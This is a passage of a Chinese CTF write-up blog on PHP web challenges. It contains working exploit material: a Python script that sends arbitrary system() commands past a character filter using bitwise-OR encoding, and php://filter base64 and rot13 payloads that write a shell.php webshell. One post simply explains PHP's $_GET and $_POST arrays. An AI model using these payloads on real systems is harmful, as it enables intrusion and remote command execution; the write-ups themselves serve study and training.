class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>解题思路</strong></p>
<p>既然能够用变量变量赋值，那么不妨开阔思路，让 <code>die($error)</code> 返回前端的结果为 flag 。</p>
<p>除开前面两个无法修改的 <code>die()</code> ，最后的两个 <code>die()</code> 都可以通过变量变量赋值为 flag 。不过要注意，应该先在禁止键为 <code>$error</code> 的 <code>$_GET</code> 数组的遍历中用 <code>$flag</code> 给 <code>$suces</code> 赋值，再在禁止值为 <code>$flag</code> 的 <code>$_POST</code> 数组的遍历中用 <code>$suces</code> 给 <code>$error</code> 赋值，方可得到 flag 。</p>
<p>Payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;&quot;error&quot;:&quot;suces&quot;&#125;</span><br><span class="line">params =  &#123;&quot;suces&quot;:&quot;flag&quot;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="题目十一"><a href="#题目十一" class="headerlink" title="题目十一"></a>题目十一</h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/04/27/PHP%E7%89%B9%E6%80%A7%E9%A2%98%E7%9B%AE/" data-id="cmag7dmmy000gp0uh1ww3dqxj" data-title="PHP 特性题目" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-利用或运算活字印刷" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/27/%E5%88%A9%E7%94%A8%E6%88%96%E8%BF%90%E7%AE%97%E6%B4%BB%E5%AD%97%E5%8D%B0%E5%88%B7/" class="article-date">
  <time class="dt-published" datetime="2025-04-27T05:44:07.000Z" itemprop="datePublished">2025-04-27</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">命令执行与文件包含</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/27/%E5%88%A9%E7%94%A8%E6%88%96%E8%BF%90%E7%AE%97%E6%B4%BB%E5%AD%97%E5%8D%B0%E5%88%B7/">利用或运算活字印刷</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>本题过滤了大量字符，但留了 <code>|</code> 运算符未被过滤，则可通过<strong>按位或运算</strong>逐字得到我们要执行的命令。</p>
<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p><code>|</code> 运算符指按位或运算，可将数值、字符等在二进制层面进行或运算：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a&quot;</span> | <span class="string">&quot;b&quot;</span>;</span><br><span class="line"><span class="comment"># 01100001 （字符 &quot;a&quot; 的 ASCII 码值 97 转换为二进制）</span></span><br><span class="line"><span class="comment"># 01100010 （字符 &quot;b&quot; 的 ASCII 码值 98 转换为二进制）</span></span><br><span class="line"><span class="comment"># 输出 c （ 01100011 ，字符 &quot;c&quot; 的 ASCII 码值 98 转换为二进制）</span></span><br></pre></td></tr></table></figure>

<p>了解了原理，看看大佬（[羽](<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/108569080">ctfshow web入门 web41_ctfshow web41-CSDN博客</a>)）写的脚本吧：</p>
<p>脚本一（PHP）：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123;  <span class="comment"># 遍历 0 到 255 （有冗余，其实到 127 即可）</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;  <span class="comment"># 补齐小于 16 的十六进制数长度</span></span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);  <span class="comment"># dechex() 函数将十进制转换为十六进制</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;  <span class="comment"># hex2bin() 函数将十六进制数值转换为原始二进制数据，如果有对应的 ASCII 字符，则输出字符</span></span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;  <span class="comment"># 只有两个字符都未被过滤的情况下，才会用于合成被过滤的字符，否则不进行任何操作</span></span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;  <span class="comment"># URL 编码前 128 位与 ASCII 码一致</span></span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;  <span class="comment"># ASCII 码前 32 位是控制字符，不可打印且无可见意义（但可用于或运算）；第 128 位是删除符，不可打印</span></span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;  <span class="comment"># 在 rce_or.txt 文件中在每行按照 A %01 %40 这样的形式拼接字符串</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure>

<p>脚本二（Python）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exp.py</span></span><br><span class="line"><span class="comment"># 运行时在命令行中输入 python exp.py &lt;目标url&gt;</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *  <span class="comment"># 会将 sys 模块中的所有公共对象导入到当前命名空间，所以下面可以直接使用 argv 而无需使用 sys. 前缀</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;php rce_or.php&quot;</span>)  <span class="comment">#没有将php写入环境变量需手动运行</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(argv)!=<span class="number">2</span>):  <span class="comment"># 纠错机制，格式错误程序会正常退出</span></span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]  <span class="comment"># 将用户输入的第二个参数作为 URL （注意“python exp.py &lt;url&gt;”中首个参数从脚本文件名开始而不是从 python 开始）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()  <span class="comment"># 每次循环文件指针后移一位， readline() 读取下一行</span></span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span>  <span class="comment"># 若读取到文件末尾都没对应字符，退出循环</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]  <span class="comment"># 分别读取每行三个部分如 A %01 %40 的内容</span></span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span>  <span class="comment"># (&quot;...&quot;|&quot;...&quot;) 拼接出准备与运算的字符串</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))  <span class="comment"># 将函数与命令拼接为 (&quot;system&quot;)(&quot;ls&quot;) 的形式（等价于 system(&quot;ls&quot;) ，此乃变量函数机制，PHP 特性）</span></span><br><span class="line">   data=&#123;</span><br><span class="line">       <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)  <span class="comment"># URL 解码</span></span><br><span class="line">       &#125;</span><br><span class="line">   r=requests.post(url,data=data)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br></pre></td></tr></table></figure>

<p>后面如果遇到可以用或运算活字印刷的，可以改一下该脚本或者自己写类似的脚本。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/04/27/%E5%88%A9%E7%94%A8%E6%88%96%E8%BF%90%E7%AE%97%E6%B4%BB%E5%AD%97%E5%8D%B0%E5%88%B7/" data-id="cmag7dmn4001kp0uh9vgkh7yr" data-title="利用或运算活字印刷" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-GET与POST数组相关知识" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/25/GET%E4%B8%8EPOST%E6%95%B0%E7%BB%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/" class="article-date">
  <time class="dt-published" datetime="2025-04-25T09:06:49.000Z" itemprop="datePublished">2025-04-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/">杂项知识点</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/25/GET%E4%B8%8EPOST%E6%95%B0%E7%BB%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/">$_GET 与 $_POST 数组相关知识</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>在PHP中，<code>$_GET</code> 和 <code>$_POST</code> 是两种独立的超全局数组，它们的参数来源和处理逻辑有本质区别：</p>
<h2 id="GET-的底层逻辑"><a href="#GET-的底层逻辑" class="headerlink" title="$_GET 的底层逻辑"></a><code>$_GET</code> 的底层逻辑</h2><ul>
<li><strong>参数来源</strong>：<strong>URL查询字符串</strong>（如 <code>?key1=value1&amp;key2=value2</code>）。</li>
<li><strong>无关请求方法</strong>：无论请求是 <code>GET</code>、<code>POST</code> 还是其他方法，只要URL中存在查询字符串，PHP都会自动解析到 <code>$_GET</code> 数组中。</li>
</ul>
<h2 id="POST-的底层逻辑"><a href="#POST-的底层逻辑" class="headerlink" title="$_POST 的底层逻辑"></a><strong><code>$_POST</code> 的底层逻辑</strong></h2><ul>
<li><strong>参数来源</strong>：<strong>请求体（Body）</strong>，且仅当请求头的 <code>Content-Type</code> 是 <code>application/x-www-form-urlencoded</code> 或 <code>multipart/form-data</code> 时（如表单提交）。</li>
<li><strong>依赖请求方法</strong>：只有使用 <code>POST</code> 方法时，PHP才会自动解析请求体到 <code>$_POST</code> 数组。</li>
<li><strong>注意</strong>：如果要在 Burp Suite 中将 GET 请求修改为 POST 请求并修改请求体，请在修改完请求行的 <code>GET</code> 后在右侧 Inspector 内修改请求体，否则 Burp Suite 不会自动向请求头中添加 <code>Content-Type</code> 字段，导致参数无法传给 <code>$_POST</code> 数组。</li>
</ul>
<p>由此可得：只要 URL 中<strong>存在查询字符串</strong>，都会被解析到 <strong><code>$_GET</code> 数组</strong>；但 <code>$_POST</code> 数组<strong>依赖 <code>POST</code> 方法与请求头</strong>，条件不满足时会有参数无法传到 <code>$_POST</code> 数组中的情况。</p>
<p><strong>关于 <code>php://input</code> 伪协议</strong></p>
<p><code>php://input</code> 伪协议可用于读取请求体的原始数据，不管请求方法是 <code>GET</code> 还是 <code>POST</code> 还是其他方法。类似 URL 传参时的 <code>$_GET</code> 数组。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/04/25/GET%E4%B8%8EPOST%E6%95%B0%E7%BB%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/" data-id="cmag7dmmm0001p0uh9l9fhlzu" data-title="$_GET 与 $_POST 数组相关知识" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag">杂项知识点</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-filter伪协议绕过die（Web87）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/25/filter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die%EF%BC%88Web87%EF%BC%89/" class="article-date">
  <time class="dt-published" datetime="2025-04-25T06:02:10.000Z" itemprop="datePublished">2025-04-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">命令执行与文件包含</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/25/filter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die%EF%BC%88Web87%EF%BC%89/">filter 伪协议绕过 die（Web87）</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>这道题不能再用条件竞争了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单说说题目：</p>
<p>该题会将 <code>$_GET</code> 数组中的 <code>file</code> 参数 URL 解码，然后以解码后的 <code>file</code> 参数作为文件路径&#x2F;文件名，生成一个内容由字符串 <code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code> 与 <code>$_POST</code> 数组中的 <code>content</code> 参数的值拼接而成的文件。</p>
<p><code>urldecode()</code>：URL 解码。</p>
<p><code>file_put_contents()</code>：为文件写入内容，默认覆盖写。</p>
<p>由于会 URL 解码，所以前面的一串过滤都可以简单绕过。但有 <code>die()</code> 函数，会立刻停止脚本，所以要想办法阻碍该函数执行。</p>
<h2 id="解法一：Base64"><a href="#解法一：Base64" class="headerlink" title="解法一：Base64"></a>解法一：Base64</h2><p>可以用 <code>php://filter</code> 伪协议，使写入文件时内容经过 Base64 解码，同时在 <code>content</code> 参数中传入 Base64 编码后的 Payload 以达到绕过 <code>die()</code> 函数、执行恶意代码的目的（ 原本正常的 <code>die()</code> 函数被解码为乱码）：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=convert.base64-decode/resource=shell.php</span></span><br></pre></td></tr></table></figure>

<p>由于有 <code>urldecode()</code> 函数，所以可以对 Payload 进行 URL 转码以绕过过滤：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%70%68%70%3A%2F%2F%66%69%6C%74%65%72%2F%77%72%69%74%65%3D%63%6F%6E%76%65%72%74%2E%62%61%73%65%36%34%2D%64%65%63%6F%64%65%2F%72%65%73%6F%75%72%63%65%3D%73%68%65%6C%6C%2E%70%68%70</span><br></pre></td></tr></table></figure>

<p>此处简单粗暴全部转码。另外， <code>file</code> 参数通过 URL 传参到服务器时，会被 URL 解码，为了使 Payload 不要过早暴露被过滤，进行第二次转码（依旧简单粗暴）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%36%33%25%36%46%25%36%45%25%37%36%25%36%35%25%37%32%25%37%34%25%32%45%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%34%25%36%35%25%36%33%25%36%46%25%36%34%25%36%35%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%37%33%25%36%38%25%36%35%25%36%43%25%36%43%25%32%45%25%37%30%25%36%38%25%37%30</span><br></pre></td></tr></table></figure>

<p>另外， <code>content</code> 参数也要转码为 Base64 ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;tac fl0g.php&#x27;) ?&gt; （跳过前面的 ls ，直接演示最后一步了）</span><br><span class="line">PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKSA/Pg==</span><br></pre></td></tr></table></figure>

<p>用 Burp Suite 抓包，将 <code>GET</code> 改为 <code>POST</code> ，修改 URL 参数，然后修改请求体。</p>
<p>由于 Base64 的处理特性（详情请自行查找）， <code>content</code> 要加两个字符（这里用 <code>aa</code> ）以保证转码后恶意代码正常：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=aaPD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKSA/Pg==</span><br></pre></td></tr></table></figure>

<p>最后发包并访问 <code>/shell.php</code> 即可。</p>
<h2 id="解法二：ROT13"><a href="#解法二：ROT13" class="headerlink" title="解法二：ROT13"></a>解法二：ROT13</h2><p>与 Base64 原理相同，也是将编码处理后的 Payload 进行解码再写入文件，同时使 <code>die()</code> 函数无效化。</p>
<p>ROT13 用同一套算法既可以编码又可以解码。以下为 Payload ：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=string.rot13/resource=shell.php</span></span><br></pre></td></tr></table></figure>

<p>二次 URL 编码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30</span><br></pre></td></tr></table></figure>

<p> <code>content</code> 参数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;tac fl0g.php&#x27;) ?&gt;</span><br><span class="line">&lt;?cuc flfgrz(&#x27;gnp sy0t.cuc&#x27;) ?&gt;</span><br></pre></td></tr></table></figure>

<p>抓包与修改同上，但不用加什么字符：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=&lt;?cuc flfgrz(&#x27;gnp sy0t.cuc&#x27;) ?&gt;</span><br></pre></td></tr></table></figure>

<p>最后发包并访问 <code>/shell.php</code> 即可。</p>

      
    </div>
    <footer class="article-footer">
